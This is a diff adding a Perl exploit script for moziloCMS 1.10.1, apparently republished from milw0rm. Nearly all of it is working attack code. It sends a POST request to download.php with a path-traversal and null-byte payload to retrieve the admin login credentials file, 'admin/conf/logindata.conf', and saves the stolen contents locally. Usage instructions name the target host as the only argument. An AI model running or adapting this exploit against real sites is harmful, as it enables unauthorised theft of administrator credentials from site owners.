@@ -1,0 +1,107 @@
+#!/usr/bin/perl
+#
+# moziloCMS 1.10.1 Perl exploit
+#
+# discovered & written by Ams
+# ax330d [doggy] gmail [dot] com
+#
+# DESCRIPTION:
+# Vulnerability hides in "download.php", which we can use to download any file we want to.
+# Here, for example, "admin/conf/logindata.conf". (Btw, not very smart solution to keep it open
+# not looking on that it is protected by .htaccess)
+# Script does not filters global params, it only checks whether local file exists...
+# (By the way, all downloads are logged to "/conf/downloads.conf")
+#
+# USAGE:
+# Run exploit :perl expl.pl http://www.site.com
+#
+# NEEDED:
+# magic_quotes_gpc = off
+#
+
+use strict;
+use IO::Socket;
+
+print "\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	\n\t\t moziloCMS 1.10.1 exploit (by Ams)
+	\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n";
+
+if(@ARGV<1){
+	die "\n\tUsage:\texpl.pl [host]\n\n
+	\n\tExample:\texpl.pl http://localhost/blog/\n\n";
+}
+
+my $expl_url = $ARGV[0];
+
+print "\n\t[~] Starting exploit...\n";
+
+if($expl_url =~ m#http://#) {
+	exploit($expl_url);
+} else {
+	exploit('http://'.$expl_url);
+}
+
+sub exploit {
+	
+	#	Defining vars.
+	my $site = pop @_;
+	my ($a, $b, $c, @d) = split /\//,$site;
+	my $path = join('/',@d);
+	my $host = $c;
+	if($path) {$path = '/'.$path;}
+	my ($length, $packet, $downloaded, $injection);
+	
+	#	Revealing /data/sess.php.
+	print "\n\t[~] Sending request to 'downloads.php'...\n";
+	$injection = "file=hola&cat=../admin/conf/logindata.conf%00";
+	$length = length($injection);
+	$packet = "POST $path/download.php HTTP/1.1\r\n";
+	$packet .= "Host: $host\r\n";
+	$packet .= "Connection: Close\r\n";
+	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$packet .= "Content-Length: $length\r\n\r\n";
+	$packet .= "$injection";
+	$downloaded = send_surprise($host, $packet, 1);
+	
+	if($downloaded =~ /hackin/) {
+		print "\n\t[-] Exploiting failed...\n";
+	} elsif ($downloaded =~ /200 OK/) {
+		#	Parsing and saving received data.
+		$downloaded =~ /\r\n\r\n/ ;
+		$downloaded = $';
+		
+		open(DOWNL, ">hola.txt");
+		print DOWNL $downloaded;
+		close(DOWNL);
+		print "\n\t[+] Looks like ok! Check hola.txt\n";
+	} else {
+		print "\n\t[-] Exploiting failed...\n";
+	}
+}
+
+sub send_surprise() {
+		
+	my $dat = 1;
+	my ($host, $packet, $ret) = @_;
+	my $socket=IO::Socket::INET->new(
+		Proto=>"tcp",
+		PeerAddr=>$host,
+		PeerPort=>"80"
+	);
+	if( ! $socket) {
+		return 0;
+	} else {
+		
+		print $socket $packet;
+		if($ret) {
+			my $rcv;
+			while($rcv = <$socket>) {
+			$dat .= $rcv;
+			}
+		}
+		close ($socket);
+		return $dat;
+	}
+}
+
+# milw0rm.com [2008-08-02]
